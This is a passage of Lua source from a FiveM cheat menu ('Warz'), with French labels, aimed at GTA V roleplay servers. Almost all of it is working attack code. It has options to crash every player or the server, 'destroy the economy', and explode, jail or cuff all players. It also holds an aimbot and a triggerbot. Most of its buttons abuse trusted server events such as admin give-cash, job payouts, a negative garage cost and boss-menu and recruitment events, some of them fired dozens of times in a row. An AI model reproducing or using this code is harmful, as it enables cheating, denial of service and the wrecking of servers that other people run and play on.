						if ids ~= PlayerId() and GetPlayerServerId(ids) ~= 0 then
							for i = 1, #allWeapons do
							RemoveAllPedWeapons(PlayerPedId(ids), true)
				end	
			end
		end
		
	elseif
		Warz.CheckBox(
		"~h~~p~Exploser ~s~Tout Les Joueurs",
		blowall,
		function(enabled)
		blowall = enabled
	end)
	then
	elseif
		Warz.CheckBox(
		"~h~~p~Crash ~s~Tout Les Joueurs",
		nuke,
		function(enabled)
		nuke = enabled
		end)
	then
	elseif
		Warz.CheckBox(
		"~p~Détruire ~s~Economie",
		esxdestroy,
		function(enabled)
		esxdestroy = enabled
		end)
	then
	elseif
		Warz.CheckBox(
		"~h~~p~Prison ~s~Tout Les Joueurs",
		banallusers,
		function(enabled)
		banallusers = enabled
		end)
	then
	elseif
		Warz.CheckBox(
		"~h~~p~Cuff ~s~Tous Les Joueurs",
		freezeall,
		function(enabled)
		freezeall = enabled
	   	end)
	then
	elseif
		Warz.CheckBox(
			"~h~~p~Crash ~s~Server",
			servercrasher,
			function(enabled)
				servercrasher = enabled
			end)
	then
	end

				Warz.Display()
			elseif Warz.IsMenuOpened("WepMenu") then
				if Warz.MenuButton("~h~~p~#~s~ Donner Une Seule Arme", "WeaponTypes") then
				elseif Warz.MenuButton("~o~~h~Ammu-Nation Crafter", "Ammu-NationCraft") then
				elseif Warz.Button("~g~Donner ~s~Toutes Les Armes") then
					for i = 1, #allWeapons do
						GiveWeaponToPed(PlayerPedId(), GetHashKey(allWeapons[i]), 1000, false, false)
					end
				elseif Warz.Button("~h~~p~Supprimer Toutes Les Armes") then
					for i = 1, #allWeapons do
						RemoveAllPedWeapons(PlayerPedId(), true)
					end
				elseif Warz.Button("~h~~b~Donnez Des Munitions") then
					for i = 1, #allWeapons do
						AddAmmoToPed(PlayerPedId(), GetHashKey(allWeapons[i]), 200)
					end
				elseif
					Warz.ComboBox(
						"~h~Dégâts D'arme Et Poing",
						{"1x (Default)", "2x", "3x", "4x", "5x"},
						currentItemIndex,
						selectedItemIndex,
						function(currentIndex, selectedIndex)
							currentItemIndex = currentIndex
							selectedItemIndex = selectedIndex
							SetPlayerWeaponDamageModifier(PlayerId(), selectedItemIndex)
							SetPlayerMeleeWeaponDamageModifier(PlayerId(), selectedItemIndex)
						end
					)
			    then
			elseif
				Warz.CheckBox(
				"~h~TriggerBot",
				TriggerBot,
				function(enabled)
				TriggerBot = enabled
				end)
				then
			elseif
				Warz.CheckBox(
				"~h~AimBot",
				AimBot,
				function(enabled)
				AimBot = enabled
				end)	
				 then
				elseif
					Warz.CheckBox(
						"~h~Munitions Infinies",
						InfAmmo,
						function(enabled)
							InfAmmo = enabled
							SetPedInfiniteAmmoClip(PlayerPedId(), InfAmmo)
						end
					)
				 then
				 elseif
					 Warz.CheckBox("~h~Vehicle Gun",VehicleGun,
				 	 function(enabled)VehicleGun = enabled end) 
			 	then
			 	elseif
					 Warz.CheckBox("~h~Delete Gun",DeleteGun,
				 	 function(enabled)DeleteGun = enabled end) 
			 	then
				end

				Warz.Display()
			elseif Warz.IsMenuOpened("SingleWepMenu") then
				for i = 1, #allWeapons do
					if Warz.Button(allWeapons[i]) then
						GiveWeaponToPed(PlayerPedId(), GetHashKey(allWeapons[i]), 1000, false, false)
					end
				end
				
				Warz.Display()
			elseif Warz.IsMenuOpened("Ammu-NationCraft") then
				if Warz.Button("~o~~h~ Carbon") then
					TriggerServerEvent('esx_ammunationjob:startHarvest')
					TriggerServerEvent('esx_ammunationjob:startHarvest')
					TriggerServerEvent('esx_ammunationjob:startHarvest')
					TriggerServerEvent('esx_ammunationjob:startHarvest')
					TriggerServerEvent('esx_ammunationjob:startHarvest')
			elseif Warz.Button("~o~~h~ Acier") then
					TriggerServerEvent('esx_ammunationjob:startHarvest2')
					TriggerServerEvent('esx_ammunationjob:startHarvest2')
					TriggerServerEvent('esx_ammunationjob:startHarvest2')
					TriggerServerEvent('esx_ammunationjob:startHarvest2')
					TriggerServerEvent('esx_ammunationjob:startHarvest2')
			elseif Warz.Button("~o~~h~ Poudre") then
					TriggerServerEvent('esx_ammunationjob:startHarvestMunition')
					TriggerServerEvent('esx_ammunationjob:startHarvestMunition')
					TriggerServerEvent('esx_ammunationjob:startHarvestMunition')
					TriggerServerEvent('esx_ammunationjob:startHarvestMunition')
					TriggerServerEvent('esx_ammunationjob:startHarvestMunition')
			elseif Warz.Button("~o~~h~ Boite de douille") then
					TriggerServerEvent('esx_ammunationjob:startHarvestMunition2')
					TriggerServerEvent('esx_ammunationjob:startHarvestMunition2')
					TriggerServerEvent('esx_ammunationjob:startHarvestMunition2')
					TriggerServerEvent('esx_ammunationjob:startHarvestMunition2')
					TriggerServerEvent('esx_ammunationjob:startHarvestMunition2')
			elseif Warz.Button("~g~~h~ Vendre Des Munitions") then
					TriggerServerEvent('esx_ammunationjob:startVenteMunition')
					TriggerServerEvent('esx_ammunationjob:startVenteMunition')
					TriggerServerEvent('esx_ammunationjob:startVenteMunition')
					TriggerServerEvent('esx_ammunationjob:startVenteMunition')
					TriggerServerEvent('esx_ammunationjob:startVenteMunition')
				end

				Warz.Display()
			elseif Warz.IsMenuOpened("VehMenu") then
                if Warz.MenuButton('~h~~p~#~s~ Véhicule ~g~Boost', 'BoostMenu') then
                elseif Warz.MenuButton('~h~~p~#~s~ Véhicule List', 'CarTypes') then 
				elseif Warz.Button("~h~~g~Spawn Véhicule") then
					local ModelName = KeyboardInput("Enter Vehicle Spawn Name", "", 100)
					if ModelName and IsModelValid(ModelName) and IsModelAVehicle(ModelName) then
						RequestModel(ModelName)
						while not HasModelLoaded(ModelName) do
							Citizen.Wait(0)
						end

						local veh = CreateVehicle(GetHashKey(ModelName), GetEntityCoords(PlayerPedId()), GetEntityHeading(PlayerPedId()), true, true)

						SetPedIntoVehicle(PlayerPedId(), veh, -1)
					else
						drawNotification("~p~Le Modèle N'est Pas Valide !")
					end
				elseif Warz.Button("Offrez Une Voiture Gratuitement") then
					fv()
				elseif Warz.Button("~h~Réparation Véhicule") then
					SetVehicleFixed(GetVehiclePedIsIn(GetPlayerPed(-1), false))
					SetVehicleDirtLevel(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0.0)
					SetVehicleLights(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
					SetVehicleBurnout(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
					Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
				elseif Warz.Button("~h~~y~Ajouter Du Carburant") then
					TriggerServerEvent('fuel:pay', refillCost)
				elseif Warz.Button("~h~Max Tuning") then
					MaxOut(GetVehiclePedIsUsing(PlayerPedId())
)				elseif Warz.Button("~h~Max mechanics ~p~new") then
					engine(GetVehiclePedIsUsing(PlayerPedId()))
				elseif
					Warz.CheckBox(
					"~h~Couleur Du Véhicule Arc-En-Ciel",
					RainbowVeh,
					function(enabled)
					RainbowVeh = enabled
					end)
				then
			    elseif Warz.Button("~h~~b~Change License Plate~p~ NEW") then
					local playerPed = GetPlayerPed(-1)
					local playerVeh = GetVehiclePedIsIn(playerPed, true)
					local result = KeyboardInput("Enter the plate license you want", "", 10)
					if result then
						SetVehicleNumberPlateText(playerVeh, result)
					end
				elseif Warz.Button("~h~~p~Supprimer Véhicule") then
					DelVeh(GetVehiclePedIsUsing(PlayerPedId()))
					drawNotification("Vehicle Deleted")
				elseif Warz.Button("~h~Rendre Le Véhicule Sale") then
					Clean(GetVehiclePedIsUsing(PlayerPedId()))
					drawNotification("Le Véhicule Est Maintenant Sale")
				elseif Warz.Button("~h~Rendre Le Véhicule Propre") then
					Clean2(GetVehiclePedIsUsing(PlayerPedId()))
					drawNotification("Le Véhicule Est Maintenant Propre")
				elseif
					Warz.CheckBox(
						"~h~No Fall",
						Nofall,
						function(enabled)
							Nofall = enabled

							SetPedCanBeKnockedOffVehicle(PlayerPedId(), Nofall)
						end
					)
				 then
				elseif
					Warz.CheckBox(
						"~h~Invinsible Véhicule",
						VehGod,
						function(enabled)
							VehGod = enabled
						end
					)
				 then
				elseif
					Warz.CheckBox(
					"~h~Véhicule Speedboost ~g~Num9",
						VehSpeed,
						function(enabled)
						VehSpeed = enabled
						end)
				then
				elseif
					Warz.CheckBox(
						"~h~Super Grip",
						supergrip,
						function(enabled)
							supergrip = enabled
						end
					)
				then
				end

				Warz.Display()
			elseif Warz.IsMenuOpened("ServerMenu") then
				if Warz.MenuButton("~s~Menu ~h~~p~RECRUIT PLAYERS", "RecrutePlayers") then
				elseif Warz.MenuButton("~s~Menu ~p~RECRUTE PLAYERS #2)", "ESXMisc") then
				elseif Warz.MenuButton("~s~Menu ~p~RECRUTE PLAYERS SecondJob", "Recrute2") then
				elseif Warz.MenuButton("~s~Menu ~p~BOSS", "ESXBoss") then
				elseif Warz.MenuButton("~s~Menu ~g~MONEY", "ESXMoney") then
				elseif Warz.MenuButton("~s~Menu ~g~DRUGS", "ESXDrugs") then
				end
				
				Warz.Display()
			elseif Warz.IsMenuOpened("Credits") then
				if Warz.Button("<FONT COLOR='#FF0000'>WarzModz#0001") then
				end

				Warz.Display()
			elseif Warz.IsMenuOpened("ESXBoss") then
				if Warz.Button("Mechanic Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'mecano', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif Warz.Button("Police Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'police', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif Warz.Button("Ambulance Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'ambulance', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif Warz.Button("Taxi Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'taxi', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif Warz.Button("Real Estate Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'realestateagent', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif Warz.Button("Gang Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'gang', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif Warz.Button("Car Dealer Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'cardealer', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif Warz.Button("Banker Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'banker', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif Warz.Button("Mafia Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'mafia', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif Warz.Button("Custom Boss Menu") then
					local result = KeyboardInput("Enter Boss Menu Script Name", "", 10)
					if result then
						TriggerEvent('esx_society:openBossMenu', result, function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
					end
				end

				Warz.Display()
			elseif Warz.IsMenuOpened("ESXMoney") then
				if Warz.Button("Admin Cash ~r~RISK Logs") then
				local result = KeyboardInput("Entrez Le montant D'argent", "", 100000000)
				if result then
				TriggerServerEvent('KorioZ-PersonalMenu:Admin_giveCash', result)
				end
			elseif Warz.Button("Admin Bank ~r~RISK Logs") then
				local result = KeyboardInput("Entrez Le montant D'argent", "", 100000000)
				if result then
				TriggerServerEvent('KorioZ-PersonalMenu:Admin_giveBank', result)
				end
			elseif Warz.Button("Admin Dirty ~r~RISK Logs") then
				local result = KeyboardInput("Entrez Le montant D'argent", "", 100000000)
				if result then
				TriggerServerEvent('KorioZ-PersonalMenu:Admin_giveDirtyMoney', result)
				end
			elseif Warz.Button("Money Wash") then
				local result = KeyboardInput("Entrez Le montant D'argent", "", 2500)
				if result then
				TriggerServerEvent('esx_blanchisseur:startWhitening', percent)
				end
			elseif Warz.Button("Admin Cash ~r~RISK Logs") then
				local result = KeyboardInput("Entrez Le montant D'argent", "", 100000000)
				if result then
				TriggerServerEvent('AdminMenu:giveCash', result)
				end
			elseif Warz.Button("MONEY 5") then
				local result = KeyboardInput("Entrez Le montant D'argent", "", 100000000)
				if result then
					TriggerServerEvent("esx_gopostaljob:pay", result)
				end
			elseif Warz.Button("MONEY 6") then
				local result = KeyboardInput("Entrez Le montant D'argent", "", 100000000)
				if result then
					TriggerServerEvent("esx_banksecurity:pay", result)
				end
			elseif Warz.Button("MONEY 7") then
				local result = KeyboardInput("Entrez Le montant D'argent", "", 100000000)
				if result then
					TriggerServerEvent("esx_slotmachine:sv:2", result)
				end
			elseif Warz.Button("MONEY 8") then
				local result = KeyboardInput("Entrez Le montant D'argent", "", 100)
				if result then
					TriggerServerEvent("lscustoms:payGarage", {costs = -result})
				end		
			elseif Warz.Button("MONEY 9") then
				local result = KeyboardInput("Entrez Le montant D'argent", "", 100)
				if result then
				TriggerServerEvent("vrp_slotmachine:server:2", result)
				end
			elseif Warz.Button("MONEY 10") then
				local result = KeyboardInput("Entrez Le montant D'argent", "", 100000000)
				if result then
					TriggerServerEvent('AdminMenu:giveDirtyMoney', result)
				end
			elseif Warz.Button("MONEY 11") then
				local result = KeyboardInput("Entrez Le montant D'argent", "", 100000000)
				if result then
					TriggerServerEvent('esx_truckerjob:pay', result)
				end
			elseif Warz.Button("MONEY 12") then
				local result = KeyboardInput("Entrez Le montant D'argent", "", 100000000)
				if result then
					TriggerServerEvent('delivery:success', result)
				end
			elseif Warz.Button("MONEY 13") then
				local result = KeyboardInput("Entrez le montant d'argent", "", 100000000)
				if result then
					TriggerServerEvent ('taxi:success', result)
				end
			elseif Warz.Button("MONEY 14") then
					TriggerServerEvent('esx_pilot:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_pilot:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_pilot:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_pilot:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_pilot:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_pilot:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_pilot:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
			elseif Warz.Button("MONEY 15") then
				local result = KeyboardInput("Entrez Le Montant D'argent", "", 100000000)
				if result then
					TriggerServerEvent("esx_garbagejob:pay", result)
				end	
			elseif Warz.Button("MONEY 16") then
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
			elseif Warz.Button("Dépôt Bank") then
				local result = KeyboardInput("Entrez Le Montant D'argent", "", 100)
				if result then
				TriggerServerEvent("bank:deposit", result)
				end
			elseif Warz.Button("Retrait Bank ") then
				local result = KeyboardInput("Entrez Le Montant D'argent", "", 100)
				if result then
				TriggerServerEvent("bank:withdraw", result)
				end
			end


			Warz.Display()
				elseif Warz.IsMenuOpened("ESXMisc") then
						for i = 0, 128 do
					if NetworkIsPlayerActive(i) and GetPlayerServerId(i) ~= 0 and Warz.MenuButton("~h~~p~-»  ~s~"..GetPlayerName(i).."", 'RecrutePlayersOptions') then
						SelectedPlayer = i
					end
				end
				
			Warz.Display()
				elseif Warz.IsMenuOpened("Recrute2") then
						for i = 0, 128 do
					if NetworkIsPlayerActive(i) and GetPlayerServerId(i) ~= 0 and Warz.MenuButton("~h~~p~-»  ~s~"..GetPlayerName(i).."", 'RecrutePlayersOptions2') then
						SelectedPlayer = i
					end
				end
				
				Warz.Display()
			elseif Warz.IsMenuOpened("RecrutePlayersOptions") then
				Warz.SetSubTitle("RecrutePlayersOptions", "Recrute Players options [" .. GetPlayerName(SelectedPlayer) .. "]")
			    if Warz.Button("Recruit Mechanic") then
				TriggerServerEvent('KorioZ-PersonalMenu:Boss_recruterplayer', GetPlayerServerId(SelectedPlayer), "mecano", 0)
			elseif Warz.Button("Recruit Police") then
				TriggerServerEvent('KorioZ-PersonalMenu:Boss_recruterplayer', GetPlayerServerId(SelectedPlayer), "police", 0)
			elseif Warz.Button("Recruit Mafia") then
				TriggerServerEvent('KorioZ-PersonalMenu:Boss_recruterplayer', GetPlayerServerId(SelectedPlayer), "mafia", 0)
			elseif Warz.Button("Recruit Gang") then
				TriggerServerEvent('KorioZ-PersonalMenu:Boss_recruterplayer', GetPlayerServerId(SelectedPlayer), "gang", 0)
			elseif Warz.Button("Recruit Ambulance") then
				TriggerServerEvent('KorioZ-PersonalMenu:Boss_recruterplayer', GetPlayerServerId(SelectedPlayer), "ambulance", 0)
			elseif Warz.Button("Custom Recruit") then
					local reason = KeyboardInput("Entrez Le Nom Du Travail", "", 100)
					local reason2 = KeyboardInput("Entrez Le Numéro De Travail Nivel 0-10", "", 10)
					if reason and reason2 then
					TriggerServerEvent('KorioZ-PersonalMenu:Boss_recruterplayer', GetPlayerServerId(SelectedPlayer), reason, reason2)
					end
				end
				
				Warz.Display()
			elseif Warz.IsMenuOpened("RecrutePlayersOptions2") then
				Warz.SetSubTitle("RecrutePlayersOptions2", "Recrute Players options [" .. GetPlayerName(SelectedPlayer) .. "]")
			    if Warz.Button("Recruit Mechanic") then
				TriggerServerEvent('KorioZ-PersonalMenu:Boss_recruterplayer2', GetPlayerServerId(SelectedPlayer), "mecano", 0)
			elseif Warz.Button("Recruit Police") then
				TriggerServerEvent('KorioZ-PersonalMenu:Boss_recruterplayer2', GetPlayerServerId(SelectedPlayer), "police", 0)
			elseif Warz.Button("Recruit Mafia") then
				TriggerServerEvent('KorioZ-PersonalMenu:Boss_recruterplayer2', GetPlayerServerId(SelectedPlayer), "mafia", 0)
			elseif Warz.Button("Recruit Gang") then
				TriggerServerEvent('KorioZ-PersonalMenu:Boss_recruterplayer2', GetPlayerServerId(SelectedPlayer), "gang", 0)
			elseif Warz.Button("Recruit Ambulance") then
				TriggerServerEvent('KorioZ-PersonalMenu:Boss_recruterplayer2', GetPlayerServerId(SelectedPlayer), "ambulance", 0)
			elseif Warz.Button("Custom Recruit") then
					local reason = KeyboardInput("Entrez Le Nom Du Travail", "", 100)
					local reason2 = KeyboardInput("Entrez Le Numéro De Travail Nivel 0-10", "", 10)
					if reason and reason2 then
					TriggerServerEvent('KorioZ-PersonalMenu:Boss_recruterplayer2', GetPlayerServerId(SelectedPlayer), reason, reason2)
					end
				end


				Warz.Display()
			elseif Warz.IsMenuOpened("VRPOptions") then
				if Warz.Button("VRP Give Money ~ypayGarage") then
					local result = KeyboardInput("Entrez Le Montant D'argent UTILISER À VOS PROPRES RISQUES", "", 100)
					if result then
						TriggerServerEvent("lscustoms:payGarage", {costs = -result})
					end		
				elseif Warz.Button("VRP WIN Slot Machine") then
					local result = KeyboardInput("Entrez le montant d'argent UTILISER À VOS PROPRES RISQUES", "", 100)
					if result then
					TriggerServerEvent("vrp_slotmachine:server:2", result)
					end
				elseif Warz.Button("VRP Get driving license") then
					TriggerServerEvent("dmv:success")
				elseif Warz.Button("VRP Bank Deposit") then
					local result = KeyboardInput("Entrez Le montant D'argent", "", 100)
					if result then
					TriggerServerEvent("bank:deposit", result)
					end
				elseif Warz.Button("VRP Bank Withdraw ") then
					local result = KeyboardInput("Entrez Le montant D'argent", "", 100)
					if result then
					TriggerServerEvent("bank:withdraw", result)
					end
			end


				Warz.Display()
			elseif Warz.IsMenuOpened("ESXDrugs") then
				if Warz.Button("Récolter L'~g~Weed ~c~(x5)") then
					TriggerServerEvent('esx_drugs:startHarvestWeed')
					TriggerServerEvent('esx_drugs:startHarvestWeed')
					TriggerServerEvent('esx_drugs:startHarvestWeed')
					TriggerServerEvent('esx_drugs:startHarvestWeed')
					TriggerServerEvent('esx_drugs:startHarvestWeed')
				elseif Warz.Button("Transformer L'~g~Weed ~c~(x5)") then
					TriggerServerEvent('esx_drugs:startTransformWeed')
					TriggerServerEvent('esx_drugs:startTransformWeed')
					TriggerServerEvent('esx_drugs:startTransformWeed')
					TriggerServerEvent('esx_drugs:startTransformWeed')
					TriggerServerEvent('esx_drugs:startTransformWeed')
				elseif Warz.Button("Vendre De L'~g~Weed ~c~(x5)") then
					TriggerServerEvent('esx_drugs:startSellWeed')
					TriggerServerEvent('esx_drugs:startSellWeed')
					TriggerServerEvent('esx_drugs:startSellWeed')
					TriggerServerEvent('esx_drugs:startSellWeed')
					TriggerServerEvent('esx_drugs:startSellWeed')
				elseif Warz.Button("Récolter L'Coke ~c~(x5)") then
					TriggerServerEvent('esx_drugs:startHarvestCoke')
				elseif Warz.Button("Transformer L'Coke ~c~(x5)") then
					TriggerServerEvent('esx_drugs:startTransformCoke')
				elseif Warz.Button("Vendre De L'Coke ~c~(x5)") then
					TriggerServerEvent('esx_drugs:startSellCoke')
				elseif Warz.Button("Récolter L'Meth ~c~(x5)") then
					TriggerServerEvent('esx_drugs:startHarvestMethlab')
					TriggerServerEvent('esx_drugs:startHarvestMethlab')
					TriggerServerEvent('esx_drugs:startHarvestMethlab')
					TriggerServerEvent('esx_drugs:startHarvestMethlab')
					TriggerServerEvent('esx_drugs:startHarvestMethlab')
				elseif Warz.Button("Transformer L'Meth ~c~(x5)") then
					TriggerServerEvent('esx_drugs:startTransformMeth')
					TriggerServerEvent('esx_drugs:startTransformMeth')
					TriggerServerEvent('esx_drugs:startTransformMeth')
					TriggerServerEvent('esx_drugs:startTransformMeth')
					TriggerServerEvent('esx_drugs:startTransformMeth')
				elseif Warz.Button("Vendre De L'Meth ~c~(x5)") then
					TriggerServerEvent('esx_drugs:startSellMeth')
					TriggerServerEvent('esx_drugs:startSellMeth')
					TriggerServerEvent('esx_drugs:startSellMeth')
					TriggerServerEvent('esx_drugs:startSellMeth')
					TriggerServerEvent('esx_drugs:startSellMeth')
				elseif Warz.Button("Récolter L'Opium ~c~(x5)") then
					TriggerServerEvent('esx_drugs:startHarvestOpium')
					TriggerServerEvent('esx_drugs:startHarvestOpium')
					TriggerServerEvent('esx_drugs:startHarvestOpium')
					TriggerServerEvent('esx_drugs:startHarvestOpium')
					TriggerServerEvent('esx_drugs:startHarvestOpium')
				elseif Warz.Button("Transformer L'Opium ~c~(x5)") then
					TriggerServerEvent('esx_drugs:startTransformOpium')
					TriggerServerEvent('esx_drugs:startTransformOpium')
					TriggerServerEvent('esx_drugs:startTransformOpium')
					TriggerServerEvent('esx_drugs:startTransformOpium')
					TriggerServerEvent('esx_drugs:startTransformOpium')
				elseif Warz.Button("Vendre De L'Opium ~c~(x5)") then
					TriggerServerEvent('esx_drugs:startSellOpium')
					TriggerServerEvent('esx_drugs:startSellOpium')
					TriggerServerEvent('esx_drugs:startSellOpium')
					TriggerServerEvent('esx_drugs:startSellOpium')
					TriggerServerEvent('esx_drugs:startSellOpium')
				elseif Warz.Button("Blanchire L'argent ~c~(x10)") then
